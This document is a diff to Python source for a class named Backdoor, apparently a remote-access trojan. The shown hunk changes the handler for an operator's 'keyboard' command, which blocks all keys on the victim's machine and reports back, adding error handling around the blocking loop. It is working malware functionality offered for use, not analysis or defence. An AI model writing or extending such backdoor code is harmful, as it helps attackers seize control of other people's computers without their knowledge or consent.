@@ -154,9 +154,11 @@ class Backdoor:
 				
 				elif command.split()[0] == "keyboard":
 					if command.split()[1] == "false":
-						for i in range(150):
-							keyboard.block_key(i)
-						self.reliable_send("[+] Keyboard disconnected")
+						try:
+							for i in range(150):
+								keyboard.block_key(i)
+							self.reliable_send("[+] Keyboard disconnected")
+						except: self.reliable_send("[-] Can't block the keyboard")
 					elif command.split()[1] == "true":
 						for i in range(150):
 							keyboard.unblock_key(i)
